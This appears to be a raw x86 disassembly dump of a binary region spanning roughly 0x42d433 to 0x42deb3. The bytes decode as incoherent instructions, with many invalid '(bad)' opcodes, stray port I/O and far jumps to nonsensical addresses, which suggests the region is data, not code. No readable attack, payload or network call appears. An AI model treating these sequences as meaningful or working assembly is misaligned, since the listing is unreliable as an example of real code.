  42d433:	add    ah,ch
  42d435:	sbb    ebp,edx
  42d437:	sahf   
  42d438:	cmc    
  42d439:	fsubp  st(7),st
  42d43b:	jnp    0x42d48c
  42d43d:	mov    al,ds:0xdf6f0781
  42d442:	mov    esi,0x1df6448
  42d447:	add    dh,dh
  42d449:	add    BYTE PTR [eax],al
  42d44b:	add    dh,bl
  42d44d:	cmp    eax,0x9d1759d7
  42d452:	out    0xd,al
  42d454:	adc    bl,al
  42d456:	cdq    
  42d457:	inc    edi
  42d458:	fild   WORD PTR [esi]
  42d45a:	sbb    eax,0xf99d8880
  42d45f:	jbe    0x42d496
  42d461:	shl    BYTE PTR [edx+0x3471fe66],0xbd
  42d468:	icebp  
  42d469:	fcmovu st,st(5)
  42d46b:	fdiv   DWORD PTR [ebp+0x449378f0]
  42d471:	data16 mov al,0xbb
  42d474:	add    eax,0x5363ea8d
  42d479:	push   ebp
  42d47a:	mov    ebx,0xa8c2df4
  42d47f:	gs fs jb 0x42d4bd
  42d483:	mov    ecx,0xafd8e1f8
  42d488:	push   esi
  42d489:	jp     0x42d4e3
  42d48b:	jne    0x42d4e6
  42d48d:	sub    DWORD PTR [esp+ecx*4-0x11],ecx
  42d491:	sbb    al,0x2f
  42d493:	xchg   ebp,eax
  42d494:	mov    al,0x2d
  42d496:	(bad)  
  42d498:	xor    DWORD PTR [esi],esi
  42d49a:	repnz mov eax,0xa6f72b9b
  42d4a0:	inc    ebx
  42d4a1:	pop    es
  42d4a2:	sub    dl,BYTE PTR [ebx-0x3521187d]
  42d4a8:	aam    0xc4
  42d4aa:	or     al,0x11
  42d4ac:	lods   eax,DWORD PTR ds:[esi]
  42d4ad:	loope  0x42d4e5
  42d4af:	je     0x42d457
  42d4b1:	ss out dx,eax
  42d4b3:	out    dx,al
  42d4b4:	addr16 fwait
  42d4b6:	mov    ecx,0x74fec795
  42d4bb:	cmp    ah,BYTE PTR [edx]
  42d4bd:	inc    eax
  42d4be:	cmp    eax,0xc32e4733
  42d4c3:	cmp    ebp,edx
  42d4c5:	out    0xfc,eax
  42d4c7:	cld    
  42d4c8:	inc    eax
  42d4c9:	test   eax,0xc99440d6
  42d4ce:	sti    
  42d4cf:	inc    edx
  42d4d0:	aam    0x3d
  42d4d2:	pushf  
  42d4d3:	add    ecx,eax
  42d4d5:	or     BYTE PTR [eax],ch
  42d4d7:	xchg   DWORD PTR [esi+0x5f],edi
  42d4da:	or     esp,DWORD PTR [esi-0x43]
  42d4dd:	sub    DWORD PTR [edx+0x0],0x70
  42d4e1:	in     eax,dx
  42d4e2:	iret   
  42d4e3:	int3   
  42d4e4:	cmp    eax,0x179a3898
  42d4e9:	popf   
  42d4ea:	xchg   ebp,eax
  42d4eb:	mov    ch,0x2a
  42d4ed:	mov    edi,DWORD PTR [esi-0x448058ba]
  42d4f3:	outs   dx,BYTE PTR ds:[esi]
  42d4f4:	test   al,0x92
  42d4f6:	mov    BYTE PTR [ecx],dl
  42d4f8:	icebp  
  42d4f9:	pop    edi
  42d4fa:	ja     0x42d4df
  42d4fc:	aaa    
  42d4fd:	and    edi,DWORD PTR [ecx+0x4db76650]
  42d503:	hlt    
  42d504:	fwait
  42d505:	or     DWORD PTR [edi+ebx*1-0x4c05d8e4],eax
  42d50c:	and    ah,bh
  42d50e:	or     BYTE PTR [edi+0x77],cl
  42d511:	bound  edx,QWORD PTR [eax]
  42d513:	in     al,dx
  42d514:	pusha  
  42d515:	xor    al,BYTE PTR ds:0x3707cfaa
  42d51b:	fist   WORD PTR ds:0xf92d541a
  42d521:	adc    eax,0x223dd353
  42d526:	das    
  42d527:	jmp    0x42d502
  42d529:	inc    ebx
  42d52a:	arpl   bx,ax
  42d52c:	jecxz  0x42d598
  42d52e:	cdq    
  42d52f:	mov    esi,0xac6937fe
  42d534:	out    0x23,al
  42d536:	mov    cl,0xec
  42d538:	cmp    al,dh
  42d53a:	dec    ecx
  42d53b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d53c:	not    DWORD PTR [eax+edi*2+0x1592c8]
	...
  42d5b3:	add    BYTE PTR [ebp+0x48],bl
  42d5b6:	jle    0x42d546
  42d5b8:	jg     0x42d578
  42d5ba:	std    
  42d5bb:	fld    TBYTE PTR [edi]
  42d5bd:	cmp    BYTE PTR [ebp-0x50],bl
  42d5c0:	add    dl,BYTE PTR [ebx]
  42d5c2:	pop    es
  42d5c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d5c4:	pop    edx
  42d5c5:	loopne 0x42d5c8
  42d5c7:	add    dh,dh
  42d5c9:	add    BYTE PTR [eax],al
  42d5cb:	add    ah,ah
  42d5cd:	int    0xab
  42d5cf:	and    eax,0x336f5b91
  42d5d4:	ins    BYTE PTR es:[edi],dx
  42d5d5:	add    dh,BYTE PTR [eax+0x27f3716f]
  42d5db:	ins    BYTE PTR es:[edi],dx
  42d5dc:	(bad)  
  42d5dd:	retf   0x1813
  42d5e0:	js     0x42d5a6
  42d5e2:	dec    esp
  42d5e3:	xchg   ebx,eax
  42d5e4:	push   ebx
  42d5e5:	(bad)  
  42d5e6:	dec    ebx
  42d5e7:	or     eax,0x23ed0a9
  42d5ec:	outs   dx,BYTE PTR ds:[esi]
  42d5ed:	dec    esp
  42d5ee:	push   cs
  42d5ef:	lds    edx,FWORD PTR [ebx-0x1d0756e7]
  42d5f5:	jae    0x42d667
  42d5f7:	xor    al,0x57
  42d5f9:	dec    ebp
  42d5fa:	scas   al,BYTE PTR es:[edi]
  42d5fb:	pop    edi
  42d5fc:	sti    
  42d5fd:	inc    ebx
  42d5fe:	fs lock inc ebp
  42d601:	sub    ecx,esi
  42d603:	outs   dx,DWORD PTR ds:[esi]
  42d604:	adc    esp,DWORD PTR [edx]
  42d606:	jecxz  0x42d5f3
  42d608:	mul    BYTE PTR [edi-0x451d4ca0]
  42d60e:	das    
  42d60f:	push   ebp
  42d610:	adc    ah,BYTE PTR [esi]
  42d612:	mov    eax,0x58b07659
  42d617:	mov    edx,0x6802c3e2
  42d61c:	push   0x29
  42d61e:	jns    0x42d642
  42d620:	test   bh,0x42
  42d623:	sbb    al,BYTE PTR [edi-0x21]
  42d626:	sbb    esp,DWORD PTR [ecx+0x7771a1e]
  42d62c:	inc    edi
  42d62d:	push   ds
  42d62e:	repz push ebp
  42d630:	and    esp,DWORD PTR [eax-0x499abc4f]
  42d636:	mov    ch,0xee
  42d638:	mov    edx,0xf440bdda
  42d63d:	ja     0x42d5de
  42d63f:	mov    esp,0xa8a00a3a
  42d644:	faddp  st(2),st
  42d646:	pop    ebx
  42d647:	jmp    0xd1e92195
  42d64c:	call   0xcc90:0xade244ac
  42d653:	mov    eax,ds:0x28b2ee80
  42d658:	dec    ecx
  42d659:	add    al,0x33
  42d65b:	mov    BYTE PTR [edx],cl
  42d65d:	sub    bh,cl
  42d65f:	lahf   
  42d660:	jnp    0x42d61c
  42d662:	stc    
  42d663:	retf   
  42d664:	adc    BYTE PTR ds:0x5bed244a,dl
  42d66a:	jecxz  0x42d6d0
  42d66c:	add    al,0xc4
  42d66e:	fist   WORD PTR [edi-0x5b51c40c]
  42d674:	jns    0x42d622
  42d676:	mov    ebp,0xa9643e22
  42d67b:	push   0x4c99a320
  42d680:	aad    0xf5
  42d682:	stos   BYTE PTR es:[edi],al
  42d683:	xchg   ebx,eax
  42d684:	adc    esi,esi
  42d686:	shl    BYTE PTR [eax-0x7c],cl
  42d689:	fcmovbe st,st(0)
  42d68b:	(bad)  
  42d68c:	cli    
  42d68d:	mov    dh,0x3d
  42d68f:	jecxz  0x42d63c
  42d691:	jbe    0x42d6f3
  42d693:	or     dl,BYTE PTR ds:0xe5dfcec1
  42d699:	pop    ecx
  42d69a:	jl     0x42d661
  42d69c:	pop    eax
  42d69d:	popa   
  42d69e:	xchg   ecx,eax
  42d69f:	mov    ebp,0xce5cb425
  42d6a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d6a5:	(bad)  
  42d6a6:	in     al,0x7b
  42d6a8:	inc    esi
  42d6a9:	test   BYTE PTR [edx-0x758b8bbc],0xed
  42d6b0:	repnz mov DWORD PTR [eax-0x7410284a],ecx
  42d6b7:	and    bl,bh
  42d6b9:	push   0xffffffa1
  42d6bb:	pop    ebp
  42d6bc:	push   es
  42d6bd:	stc    
  42d6be:	inc    ebx
  42d6bf:	push   eax
  42d6c0:	xrelease lock add BYTE PTR [eax],al
	...
  42d734:	cmp    BYTE PTR [ecx-0x8046a96],cl
  42d73a:	jmp    FWORD PTR [ebp-0x78eb318b]
  42d740:	ret    0xc364
  42d743:	fist   WORD PTR [eax-0x1f]
  42d746:	add    DWORD PTR [eax],eax
  42d748:	test   BYTE PTR [eax],0x0
  42d74b:	add    BYTE PTR [esi],al
  42d74d:	fsub   st,st(7)
  42d74f:	fnstcw WORD PTR [edx]
  42d751:	mov    BYTE PTR [ebp+ecx*1-0x35],dh
  42d755:	(bad)  
  42d756:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d757:	sub    eax,0xfaef4752
  42d75c:	or     cl,0x3d
  42d75f:	cwde   
  42d760:	jbe    0x42d79d
  42d762:	jo     0x42d7d8
  42d764:	aam    0x3f
  42d766:	clc    
  42d767:	int    0x21
  42d769:	mov    ds:0x1062ade4,eax
  42d76e:	add    dh,al
  42d770:	je     0x42d7c2
  42d772:	cmp    dh,BYTE PTR [edx-0x24]
  42d775:	repz mul ch
  42d778:	xor    BYTE PTR [eax],bl
  42d77a:	iret   
  42d77b:	pop    eax
  42d77c:	fwait
  42d77d:	push   ecx
  42d77e:	aad    0x11
  42d780:	dec    esp
  42d781:	inc    ebx
  42d782:	lea    ebp,[edi]
  42d784:	rcl    ch,cl
  42d786:	dec    edx
  42d787:	pop    es
  42d788:	retf   0x633a
  42d78b:	mov    ecx,0x5978d87b
  42d790:	stc    
  42d791:	add    al,0x83
  42d793:	mov    bh,0xd
  42d795:	sahf   
  42d796:	mov    esi,0xfc47e6f
  42d79b:	cmp    BYTE PTR [eax],dh
  42d79d:	jno    0x42d721
  42d79f:	cmp    DWORD PTR [edx+0xfe4e379],0x3c9dc0fa
  42d7a9:	xchg   DWORD PTR [eax],ebp
  42d7ab:	fxam   
  42d7ad:	out    0xe5,al
  42d7af:	(bad)  
  42d7b0:	dec    ebp
  42d7b1:	lea    esi,ds:0x4ab9d793
  42d7b7:	repnz iret 
  42d7b9:	test   BYTE PTR [ebx],al
  42d7bb:	push   0x1089943
  42d7c0:	cmp    esi,edi
  42d7c2:	aad    0x51
  42d7c4:	xor    BYTE PTR ds:0x115fddbd,dh
  42d7ca:	mov    dl,0x54
  42d7cc:	in     al,0xbd
  42d7ce:	mov    cl,0xd4
  42d7d0:	ds adc al,0x6
  42d7d3:	push   0x87186c7e
  42d7d8:	push   0x7
  42d7da:	jo     0x42d75c
  42d7dc:	jecxz  0x42d7b8
  42d7de:	inc    edi
  42d7df:	ja     0x42d7c1
  42d7e1:	cmp    dh,BYTE PTR [ebp-0x1e6f5141]
  42d7e7:	rcr    DWORD PTR [edi+0x1a51c769],cl
  42d7ed:	adc    eax,0xf9a86d0c
  42d7f2:	test   BYTE PTR [edx-0x23],cl
  42d7f5:	imul   esi,DWORD PTR [edx-0x46267749],0xe2113c87
  42d7ff:	adc    DWORD PTR [ebx+0x6e],eax
  42d802:	mov    eax,0x4a874ae7
  42d807:	push   ecx
  42d808:	stc    
  42d809:	adc    eax,eax
  42d80b:	lock imul ebx,DWORD PTR [ecx+0x5d],0x40
  42d810:	push   0x2e
  42d812:	xchg   edx,eax
  42d813:	dec    ebp
  42d814:	call   0x582:0x98e04884
  42d81b:	xor    esi,DWORD PTR [eax]
  42d81d:	pop    esi
  42d81e:	adc    BYTE PTR [ebx],dh
  42d820:	xchg   ebx,eax
  42d821:	mov    cl,0x56
  42d823:	in     eax,0x19
  42d825:	mov    dl,0xe3
  42d827:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d828:	pop    ebx
  42d829:	popa   
  42d82a:	mov    ebp,0xddc1cfdb
  42d82f:	loop   0x42d8af
  42d831:	jae    0x42d81d
  42d833:	ja     0x42d7ed
  42d835:	add    eax,0xa03f2f00
  42d83a:	dec    esi
  42d83b:	addr16 cmp dh,0x2f
  42d83f:	out    0xac,al
  42d841:	mov    dh,0x0
	...
  42d8b3:	add    BYTE PTR [eax],dl
  42d8b5:	sbb    ecx,ecx
  42d8b7:	jmp    0xfb73d487
  42d8bc:	mov    edx,0x1cdcc254
  42d8c1:	inc    ecx
  42d8c2:	add    eax,0x1e246f4
  42d8c7:	add    dh,dh
  42d8c9:	add    BYTE PTR [eax],al
  42d8cb:	add    BYTE PTR [edi+0x5168448e],bh
  42d8d1:	test   eax,0xf055c6a2
  42d8d6:	jae    0x42d867
  42d8d8:	out    dx,al
  42d8d9:	lock pop ecx
  42d8db:	jl     0x42d927
  42d8dd:	outs   dx,DWORD PTR ds:[esi]
  42d8de:	inc    esp
  42d8df:	xchg   ebx,eax
  42d8e0:	enter  0x4ab0,0xf2
  42d8e4:	and    DWORD PTR [esi-0x69052d59],ecx
  42d8ea:	(bad)  
  42d8eb:	or     al,0xde
  42d8ed:	in     al,0xdf
  42d8ef:	xor    eax,0xe2326602
  42d8f4:	inc    ecx
  42d8f5:	mov    esp,0xa2ff47e5
  42d8fa:	cwde   
  42d8fb:	das    
  42d8fc:	pop    ss
  42d8fd:	pop    ebx
  42d8fe:	out    0x2f,al
  42d900:	push   cs
  42d901:	outs   dx,BYTE PTR ds:[esi]
  42d902:	mov    eax,DWORD PTR [eax+0x78]
  42d905:	imul   edi,edx,0xffffffa3
  42d908:	test   BYTE PTR gs:[edi],0x1e
  42d90c:	cli    
  42d90d:	push   cs
  42d90e:	dec    edx
  42d90f:	add    bl,BYTE PTR [ebp+0x11dfe6af]
  42d915:	push   0xffffff97
  42d917:	sahf   
  42d918:	and    ch,BYTE PTR [esi]
  42d91a:	mov    ebx,0xfd6177e9
  42d91f:	js     0x42d996
  42d921:	jecxz  0x42d8d8
  42d923:	(bad)
  42d926:	push   ecx
  42d927:	mov    ecx,DWORD PTR [ecx]
  42d929:	pop    bp
  42d92b:	mov    DWORD PTR [eax],eax
  42d92d:	adc    edx,esi
  42d92f:	ret    0xcf4a
  42d932:	lods   al,BYTE PTR ds:[esi]
  42d933:	xor    BYTE PTR [esi+0xbc39124],al
  42d939:	sar    DWORD PTR [ebp-0x6f],cl
  42d93c:	bound  edi,QWORD PTR [esi]
  42d93e:	push   cs
  42d93f:	jae    0x42d937
  42d941:	xor    DWORD PTR [edi+0x5c],ebx
  42d944:	pop    eax
  42d945:	leave  
  42d946:	sti    
  42d947:	jb     0x42d911
  42d949:	ficomp DWORD PTR [edi-0x3a]
  42d94c:	sti    
  42d94d:	popf   
  42d94e:	jmp    0xd1e3:0xf7f9a75a
  42d955:	mov    cl,0xb2
  42d957:	xchg   esi,eax
  42d958:	cmp    ch,BYTE PTR [ebx+0xf]
  42d95b:	push   ss
  42d95c:	repnz mov esi,0x8d483b24
  42d962:	mov    eax,ds:0xb687c988
  42d967:	cmc    
  42d968:	mov    DWORD PTR [edx+0x22],esi
  42d96b:	or     eax,0x7bf140e5
  42d970:	fimul  WORD PTR [eax-0x54]
  42d973:	jns    0x42d947
  42d975:	stos   BYTE PTR es:[edi],al
  42d976:	xchg   edi,eax
  42d977:	repnz es leave 
  42d97a:	cmp    bh,bh
  42d97c:	jo     0x42d9bb
  42d97e:	pop    ebx
  42d97f:	div    DWORD PTR [ecx+0x3b591b20]
  42d985:	push   0xffffffc2
  42d987:	mov    es,WORD PTR [ecx+0x164efebe]
  42d98d:	jae    0x42d957
  42d98f:	sub    eax,0x1f96f0a8
  42d994:	stos   DWORD PTR es:[edi],eax
  42d995:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d996:	mov    ah,0x1b
  42d998:	pop    esi
  42d999:	cs and al,0x7f
  42d99c:	add    eax,0xe9897506
  42d9a1:	mov    ah,0x94
  42d9a3:	dec    ecx
  42d9a4:	mov    al,ds:0xa9098415
  42d9a9:	push   0x42
  42d9ab:	dec    esp
  42d9ac:	pop    es
  42d9ad:	sbb    DWORD PTR [eax+ebp*1],esp
  42d9b0:	js     0x42da19
  42d9b2:	js     0x42d9e9
  42d9b4:	mov    BYTE PTR [ecx+0x7f],ch
  42d9b7:	mul    bh
  42d9b9:	dec    edx
  42d9ba:	test   al,0x93
  42d9bc:	pushf  
  42d9bd:	pop    edi
  42d9be:	lock xor eax,DWORD PTR [ebp+0x60]
	...
  42da31:	add    BYTE PTR [eax],al
  42da33:	add    BYTE PTR [edi-0x2be7726],ah
  42da39:	push   ebx
  42da3a:	out    dx,eax
  42da3b:	(bad)  
  42da3c:	jp     0x42da02
  42da3e:	dec    edi
  42da3f:	(bad)  
  42da40:	nop
  42da41:	push   eax
  42da42:	pop    ds
  42da43:	int    0x3c
  42da45:	jecxz  0x42da48
  42da47:	add    dh,dh
  42da49:	add    BYTE PTR [eax],al
  42da4b:	add    dh,ch
  42da4d:	xor    DWORD PTR [ebx],edx
  42da4f:	xchg   BYTE PTR [edi],dl
  42da51:	pop    es
  42da52:	and    eax,0x7ed8295
  42da57:	lods   eax,DWORD PTR ds:[esi]
  42da58:	xchg   edx,eax
  42da59:	gs push 0xffffff8f
  42da5c:	inc    edi
  42da5d:	add    eax,0x7fd0b7b9
  42da62:	and    edx,DWORD PTR [eax-0x4a30a42c]
  42da68:	fs xchg ebx,eax
  42da6a:	jbe    0x42dad0
  42da6c:	loop   0x42da32
  42da6e:	imul   edx,DWORD PTR [edi+ebx*2-0x3d7c007e],0xffffffaf
  42da76:	and    eax,esp
  42da78:	xor    BYTE PTR [ebx+0x25],ch
  42da7b:	sbb    edx,edi
  42da7d:	cmp    BYTE PTR [eax-0x70],dh
  42da80:	loope  0x42dabe
  42da82:	test   eax,0x74e44f25
  42da87:	cmc    
  42da88:	push   ebx
  42da89:	inc    ebp
  42da8a:	xchg   ecx,eax
  42da8b:	and    eax,0xb91a9ece
  42da90:	hlt    
  42da91:	cld    
  42da92:	(bad)  
  42da93:	xchg   edi,eax
  42da94:	mov    ebp,0x607c171
  42da99:	scas   al,BYTE PTR es:[edi]
  42da9a:	js     0x42dac5
  42da9c:	test   DWORD PTR [edi],esi
  42da9e:	or     dl,BYTE PTR [ebp-0x11326003]
  42daa4:	fnstenv [edx+0x43]
  42daa7:	jb     0x42db25
  42daa9:	popa   
  42daaa:	xor    al,0xc1
  42daac:	sub    eax,0x9f3b7bb4
  42dab1:	add    eax,0x82ec243a
  42dab6:	sbb    cl,bl
  42dab8:	lahf   
  42dab9:	popa   
  42daba:	inc    ebx
  42dabb:	gs mov al,0x4c
  42dabe:	mov    cl,0x68
  42dac0:	aas    
  42dac1:	mov    al,0xb7
  42dac3:	jp     0x42dad2
  42dac5:	repz and al,0x80
  42dac8:	mov    dl,BYTE PTR [edx-0x20dd21b5]
  42dace:	pop    edx
  42dacf:	jp     0x42da97
  42dad1:	sbb    esi,DWORD PTR [edi]
  42dad3:	cmp    al,BYTE PTR [ebp-0x10]
  42dad6:	aaa    
  42dad7:	push   esi
  42dad8:	cmp    ah,BYTE PTR [esi]
  42dada:	fsubr  QWORD PTR [eax+ebp*2+0x157e36a]
  42dae1:	pop    ss
  42dae2:	mov    bl,0x18
  42dae4:	or     bl,BYTE PTR [ecx-0x55]
  42dae7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42dae8:	test   BYTE PTR [edi],dh
  42daea:	push   ebx
  42daeb:	adc    eax,DWORD PTR [ecx+0x4c]
  42daee:	test   BYTE PTR [ebx-0x649ef4db],al
  42daf4:	je     0x42dae4
  42daf6:	jo     0x42dad7
  42daf8:	je     0x42db03
  42dafa:	idiv   BYTE PTR [eax-0x59625a42]
  42db00:	pop    ss
  42db01:	xchg   edi,eax
  42db02:	jae    0x42daeb
  42db04:	fcom   QWORD PTR [ebx-0x4c2016a]
  42db0a:	cmp    al,0x4c
  42db0c:	(bad)  
  42db0d:	sbb    eax,0xa846de97
  42db12:	lods   eax,DWORD PTR ds:[esi]
  42db13:	xor    eax,0xb75928e1
  42db18:	gs xchg esp,eax
  42db1a:	inc    esi
  42db1b:	cld    
  42db1c:	(bad)  
  42db1d:	out    dx,eax
  42db1e:	xchg   ebx,eax
  42db1f:	sub    BYTE PTR [edi],bl
  42db21:	jp     0x42db88
  42db23:	jne    0x42db74
  42db25:	icebp  
  42db26:	mov    al,0xfe
  42db28:	xchg   ebx,eax
  42db29:	popf   
  42db2a:	call   0x24a6d645
  42db2f:	xchg   ecx,eax
  42db30:	shl    esp,0x9d
  42db33:	outs   dx,BYTE PTR ds:[esi]
  42db34:	iret   
  42db35:	sbb    bl,bh
  42db37:	xor    DWORD PTR [ebx+0x463236ca],ecx
  42db3d:	popa   
  42db3e:	jmp    0x0:0x904727
	...
  42dbb1:	add    BYTE PTR [eax],al
  42dbb3:	add    BYTE PTR [edi+0x2],bh
  42dbb6:	mov    esp,DWORD PTR [edi+edi*8-0x13]
  42dbba:	call   FWORD PTR [ebx]
  42dbbc:	(bad)  
  42dbbd:	mov    fs:0xafab8537,al
  42dbc3:	or     BYTE PTR [edx],dh
  42dbc5:	in     al,0x1
  42dbc7:	add    dh,dh
  42dbc9:	add    BYTE PTR [eax],al
  42dbcb:	add    BYTE PTR [ecx-0x1],cl
  42dbce:	fdivp  st(4),st
  42dbd0:	rol    edx,0x3f
  42dbd3:	jmp    0x3e4c:0xc5cd043e
  42dbda:	mov    DWORD PTR [edi+0x4f],edi
  42dbdd:	aaa    
  42dbde:	xchg   edi,eax
  42dbdf:	lods   al,BYTE PTR ds:[esi]
  42dbe0:	sbb    eax,0x599b694b
  42dbe5:	fbstp  TBYTE PTR [ebx-0x69bb48e9]
  42dbeb:	pop    esp
  42dbec:	mov    es:0xe06d2f4d,eax
  42dbf2:	mov    al,ds:0xcdbb99ad
  42dbf7:	js     0x42db8b
  42dbf9:	adc    al,0x49
  42dbfb:	sti    
  42dbfc:	mov    bh,0x62
  42dbfe:	stos   BYTE PTR es:[edi],al
  42dbff:	stc    
  42dc00:	dec    eax
  42dc01:	push   edx
  42dc02:	(bad)  
  42dc03:	cwde   
  42dc04:	mov    bh,0x7a
  42dc06:	aam    0x2d
  42dc08:	jge    0xb102021d
  42dc0e:	add    al,0x29
  42dc10:	(bad)  
  42dc11:	mov    cl,0x1c
  42dc13:	js     0x42dbca
  42dc15:	or     eax,0x567b99ea
  42dc1a:	adc    bl,BYTE PTR [esi+ecx*4+0x72]
  42dc1e:	in     eax,0x73
  42dc20:	or     BYTE PTR [edi+esi*4],ah
  42dc23:	push   cs
  42dc24:	xchg   edi,eax
  42dc25:	sbb    BYTE PTR [ebx+0x49062653],0x89
  42dc2c:	pop    ebx
  42dc2d:	lods   eax,DWORD PTR ds:[esi]
  42dc2e:	adc    esi,ecx
  42dc30:	push   edx
  42dc31:	enter  0xc09f,0x9f
  42dc35:	imul   esi,ebp,0xffffffc8
  42dc38:	pop    es
  42dc39:	fbstp  TBYTE PTR [eax-0x51]
  42dc3c:	call   0x5ad7aa80
  42dc41:	mov    ch,0x85
  42dc43:	das    
  42dc44:	or     ebp,ebx
  42dc46:	pusha  
  42dc47:	sub    BYTE PTR [edx-0x1d],dh
  42dc4a:	dec    eax
  42dc4b:	pop    ebp
  42dc4c:	mov    eax,0xc78c884d
  42dc51:	push   edi
  42dc52:	dec    ecx
  42dc53:	jmp    0x42dc96
  42dc55:	cmp    cl,BYTE PTR [edx+ebx*2-0x3f]
  42dc59:	loopne 0x42dbf2
  42dc5b:	inc    esp
  42dc5c:	xor    BYTE PTR [edx-0x3e],bl
  42dc5f:	cmove  ebp,DWORD PTR [edi]
  42dc62:	xchg   ebp,eax
  42dc63:	mov    esp,esp
  42dc65:	in     eax,dx
  42dc66:	js     0x42dc50
  42dc68:	in     eax,dx
  42dc69:	mov    ebx,0x43ff0799
  42dc6e:	mov    cl,0x3d
  42dc70:	inc    ebx
  42dc71:	into   
  42dc72:	pusha  
  42dc73:	jnp    0x42dc05
  42dc75:	ss aam 0x1
  42dc78:	mov    BYTE PTR [edx-0x32bc1319],ah
  42dc7e:	out    0x7,eax
  42dc80:	dec    ecx
  42dc81:	ins    DWORD PTR es:[edi],dx
  42dc82:	mov    ebx,DWORD PTR [edi]
  42dc84:	sub    dl,ah
  42dc86:	cli    
  42dc87:	call   DWORD PTR [ebx]
  42dc89:	push   eax
  42dc8a:	push   esi
  42dc8b:	push   0xffffffff
  42dc8d:	mov    eax,ds:0x48758e50
  42dc92:	data16 icebp 
  42dc94:	(bad)  
  42dc95:	(bad)  
  42dc96:	cld    
  42dc97:	sbb    ch,BYTE PTR [edx-0xc926011]
  42dc9d:	mov    bh,0xca
  42dc9f:	test   DWORD PTR [edi+0xa2b66d0],edx
  42dca5:	fmul   st(0),st
  42dca7:	jne    0x42dcea
  42dca9:	shl    DWORD PTR [edx],cl
  42dcab:	push   ecx
  42dcac:	fnsave [ecx-0x6a]
  42dcaf:	lock sbb ch,BYTE PTR [edi]
  42dcb2:	sbb    edi,DWORD PTR ds:0x3c757cc8
  42dcb8:	popa   
  42dcb9:	ja     0x42dc4a
  42dcbb:	cdq    
  42dcbc:	xchg   edx,eax
  42dcbd:	pusha  
  42dcbe:	mov    ds:0x91bde9,eax
	...
  42dd33:	add    BYTE PTR [ecx],bl
  42dd35:	mov    eax,ds:0xdffe87fe
  42dd3a:	jns    0x42dcfb
  42dd3c:	daa    
  42dd3d:	data16 fnstsw WORD PTR [ecx-0x77bf367c]
  42dd44:	sub    ch,ah
  42dd46:	add    DWORD PTR [eax],eax
  42dd48:	test   BYTE PTR [eax],0x0
  42dd4b:	add    BYTE PTR [eax+0xff85e38],al
  42dd51:	inc    edi
  42dd52:	xchg   edx,eax
  42dd53:	mov    bl,0x66
  42dd55:	cmc    
  42dd56:	enter  0x5519,0x7b
  42dd5a:	push   0x1ed29336
  42dd5f:	jmp    0xba73:0x6612461
  42dd66:	push   esi
  42dd67:	scas   al,BYTE PTR es:[edi]
  42dd68:	mov    BYTE PTR [eax],bh
  42dd6a:	imul   eax,eax,0xb9719ae0
  42dd70:	and    edx,esi
  42dd72:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42dd73:	xchg   edi,eax
  42dd74:	lahf   
  42dd75:	jp     0x42dd08
  42dd77:	cmp    edx,ecx
  42dd79:	push   ebp
  42dd7a:	ror    DWORD PTR [ecx+0x3f768cc3],cl
  42dd80:	cmp    ebx,DWORD PTR [ebp+0x37e442ae]
  42dd86:	push   0xe0b7aa1f
  42dd8b:	lods   eax,DWORD PTR ds:[esi]
  42dd8c:	fstp   QWORD PTR [eax-0xc676aeb]
  42dd92:	addr16 sub eax,0x75eee7fb
  42dd98:	jg     0x42ddfe
  42dd9a:	jle    0x42de0d
  42dd9c:	pop    ebp
  42dd9d:	(bad)  
  42dd9e:	stc    
  42dd9f:	mov    edi,edx
  42dda1:	sub    al,0x82
  42dda3:	pop    edx
  42dda4:	sbb    eax,0x26ce2617
  42dda9:	in     al,dx
  42ddaa:	loope  0x42ddd8
  42ddac:	(bad)  
  42ddad:	mov    ch,0x85
  42ddaf:	or     ecx,DWORD PTR [edi-0x1c84c894]
  42ddb5:	(bad)  
  42ddb6:	mov    ah,0xb2
  42ddb8:	lea    edi,[edx-0x37948158]
  42ddbe:	in     al,dx
  42ddbf:	lods   eax,DWORD PTR ds:[esi]
  42ddc0:	pop    edx
  42ddc1:	and    edx,ebp
  42ddc3:	or     dl,dh
  42ddc5:	enter  0x5c6e,0xcd
  42ddc9:	add    bl,bh
  42ddcb:	std    
  42ddcc:	repnz sahf 
  42ddce:	call   0x42ce12f6
  42ddd3:	xor    eax,0x8528652
  42ddd8:	sar    BYTE PTR [eax+0x6],1
  42dddb:	fild   DWORD PTR [edi]
  42dddd:	add    ecx,ebx
  42dddf:	sub    BYTE PTR [edx+eax*2+0x25a3783],al
  42dde6:	shl    bl,0x15
  42dde9:	dec    ecx
  42ddea:	and    al,0x7e
  42ddec:	in     eax,0x1f
  42ddee:	xor    DWORD PTR [eax-0x5b745dfb],edx
  42ddf4:	mul    DWORD PTR [eax-0x68]
  42ddf7:	cmc    
  42ddf8:	adc    ebp,0xffffff90
  42ddfb:	xor    BYTE PTR [edx+ecx*4+0x45],dh
  42ddff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42de00:	mov    BYTE PTR [edx],dh
  42de02:	pusha  
  42de03:	pusha  
  42de04:	pop    esp
  42de05:	cmp    eax,0x9d7d27e3
  42de0a:	cmp    ebx,DWORD PTR [esi]
  42de0c:	xor    DWORD PTR [esi-0xe],0x18755bac
  42de13:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42de14:	int3   
  42de15:	sub    BYTE PTR [eax-0x14],al
  42de18:	lahf   
  42de19:	inc    ecx
  42de1a:	dec    esi
  42de1b:	cld    
  42de1c:	adc    eax,ebp
  42de1e:	mov    dh,0xaf
  42de20:	pop    ss
  42de21:	pop    ss
  42de22:	mov    ah,0x12
  42de24:	bound  ebp,QWORD PTR [ecx]
  42de26:	jo     0x42dded
  42de28:	repz pop eax
  42de2a:	ret    
  42de2b:	add    al,0xaa
  42de2d:	repnz mov bh,BYTE PTR [eax]
  42de30:	jg     0x42ddca
  42de32:	test   DWORD PTR [ecx+0x69],edi
  42de35:	dec    esp
  42de36:	test   BYTE PTR [edx+0x29],bl
  42de39:	mov    ds:0x4aa8b8bc,al
  42de3e:	xchg   ecx,eax
  42de3f:	nop
  42de40:	pop    edi
  42de41:	sub    eax,DWORD PTR [eax]
	...
  42deb3:	add    BYTE PTR [ebx+0x3d],dh
